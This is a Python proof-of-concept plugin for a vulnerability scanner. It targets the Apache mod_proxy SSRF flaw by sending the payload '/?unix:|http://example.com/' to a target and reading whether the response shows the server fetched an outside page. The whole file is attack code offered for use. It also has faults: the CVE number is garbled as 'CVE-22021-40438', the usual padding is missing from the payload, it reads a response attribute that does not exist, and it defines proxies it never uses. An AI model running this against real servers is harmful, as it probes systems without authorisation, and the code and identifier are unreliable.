import pocs
from lib import config
import re
import urllib.request
import ssl
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

# 定义类 名称不可改变，且需要继承父类Pocs
class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        # 根据漏洞的信息进行定义
        super().__init__()
        self.poc_name='Apache HTTP Server mod_proxy SSRF漏洞'
        self.vul_name='Apache HTTP Server mod_proxy SSRF漏洞'
        self.vul_num='CVE-22021-40438'
        self.app_name='Apache HTTP'
        self.app_version='2.4.48 '
        self.author='haochen'
        self.msg='mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器地址进而导致SSRF漏洞'
        # 根据需要的参数进行定义，被攻击的url或ip必须定义为target
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        # 自由发挥
        att_msg={}
        # 将攻击的目标和poc名称导入
        proxies = {
        "http": 'http://127.0.0.1:8081',
        "https": 'http://127.0.0.1:8081'
        } 
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        self.must_parameter = must_parameter
        head = config.Pack
        self.payload='/?unix:|http://example.com/'
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            request = urllib.request.Request(url=target)
            context = ssl._create_unverified_context()
            response = urllib.request.urlopen(request,context=context)
            # 攻击完成后需要将攻击的结果写入
            if 'Example Domain' in response.read().decode('utf-8'):
                att_msg['status'] = 'success'
                att_msg['msg'] = '存在漏洞'
            else:
                att_msg['status']='failed'
                att_msg['msg']='不存在漏洞，网站返回值为: '+str(response.status_code) 
                #self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            att_msg['status']='error'
            att_msg['msg']='无法正确访问网站'
            #self.set_cout('error','无法正确访问网站！')
        # 返回攻击结果信息
        return att_msg